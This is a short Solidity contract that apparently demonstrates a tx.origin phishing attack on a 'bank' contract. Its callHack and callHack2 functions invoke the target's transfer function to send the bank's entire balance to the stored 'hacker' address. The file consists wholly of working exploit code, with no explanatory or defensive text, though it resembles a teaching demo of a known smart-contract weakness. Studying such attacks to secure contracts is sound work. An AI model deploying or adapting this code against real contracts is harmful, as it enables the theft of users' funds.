// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

interface TXOrigin {
    function tra(address, uint256) external;
}

contract CallOtherCon {
    address payable public hacker;

    event HackSuccess(string h);

    error ExecutionResult(string message);
    TXOrigin txo;

    constructor(address bank) {
        hacker = payable(msg.sender);
        txo = TXOrigin(bank);
    }

    function callHack2(address bank) public {
        txo.tra(hacker, address(bank).balance);
    }

    function callHack(address bankAdd) external {
        (bool success, ) = bankAdd.call(
            abi.encodeWithSignature(
                "tra(address,uint256)",
                hacker,
                address(bankAdd).balance
            )
        );

        if (!success) {
            revert ExecutionResult("hack error");
        }
    }
}
